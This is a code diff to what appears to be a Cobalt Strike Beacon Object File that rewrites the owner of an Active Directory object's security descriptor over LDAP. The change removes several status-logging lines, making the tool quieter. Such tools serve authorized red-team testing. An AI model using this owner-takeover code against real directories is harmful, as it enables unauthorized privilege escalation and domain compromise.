@@ -28,10 +28,6 @@ void go(char *args, int alen) {
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting set owner operation");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s %s", targetIdentifier, isTargetDN ? "(DN)" : "(name)");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] New owner: %s %s", ownerIdentifier, isOwnerDN ? "(DN)" : "(name)");
-
     // Initialize LDAP connection
     char* dcHostname = NULL;
     LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
@@ -70,7 +66,6 @@ void go(char *args, int alen) {
             CleanupLDAP(ld);
             return;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target DN: %s", targetDN);
     }
 
     // Resolve owner DN and get SID
@@ -117,7 +112,6 @@ void go(char *args, int alen) {
     }
 
     // Read current security descriptor
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reading current security descriptor...");
     BERVAL* sdBerval = ReadSecurityDescriptor(ld, targetDN);
     if (!sdBerval) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor");
@@ -150,7 +144,6 @@ void go(char *args, int alen) {
     MSVCRT$free(sdBerval);
 
     // Set the new owner
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Setting new owner...");
     if (!ADVAPI32$SetSecurityDescriptorOwner(pSD, ownerSid, FALSE)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set security descriptor owner");
         MSVCRT$free(pSD);
@@ -178,12 +171,10 @@ void go(char *args, int alen) {
     }
 
     // Write the modified security descriptor back
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Writing modified security descriptor...");
     BOOL success = WriteSecurityDescriptor(ld, targetDN, newSdBerval);
 
     if (success) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set owner");
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target: %s", targetDN);
         BeaconPrintf(CALLBACK_OUTPUT, "[+] New owner: %s", ownerDN ? ownerDN : ownerIdentifier);
     } else {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to write security descriptor");
@@ -200,6 +191,4 @@ void go(char *args, int alen) {
     if (defaultNC) MSVCRT$free(defaultNC);
     if (dcHostname) MSVCRT$free(dcHostname);
     CleanupLDAP(ld);
-
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Operation complete");
 }
